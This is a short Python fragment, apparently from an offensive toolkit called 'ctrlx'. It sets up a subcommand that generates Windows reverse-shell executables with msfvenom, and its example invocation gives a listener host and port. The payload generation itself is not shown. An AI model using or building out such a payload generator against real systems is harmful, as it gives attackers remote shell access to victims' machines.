...
def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx axt --type w0x",
        description="Generate Windows reverse shell payload (.exe) using msfvenom",
        epilog="Contoh: python ctrlx.py axt --type w0x --lhost 192.168.1.5 --lport 4444 --format exe --save"
    )
    ...
    parser.add_argument("--format", default="exe", choices=["exe", "raw"], help="Output format (default: exe)")
